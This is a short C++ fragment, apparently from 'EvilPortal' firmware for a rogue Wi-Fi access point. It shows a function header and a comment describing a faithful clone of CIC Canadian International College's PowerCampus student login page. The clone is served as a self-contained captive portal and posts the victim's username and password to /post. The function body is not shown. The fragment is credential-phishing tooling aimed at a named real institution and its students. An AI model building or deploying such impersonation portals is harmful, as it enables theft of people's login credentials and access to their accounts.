...
void EvilPortal::loadDefaultHtml_cic() {
    // CIC Canadian International College — PowerCampus Self-Service login clone.
    // Faithful red/maroon PowerCampus layout: header logo + Catalog search, Home/Search
    // tabs, left Login sidebar, student splash collage, maroon footer. Responsive so it
    // stacks cleanly on phones. Logo + collage are embedded as base64 so the captive
    // portal is fully self-contained (no internet on the rogue AP). 67KB String lands in
    // PSRAM (BOARD_HAS_PSRAM). Mirrors data/cic.html. Posts to /post (user+pass).
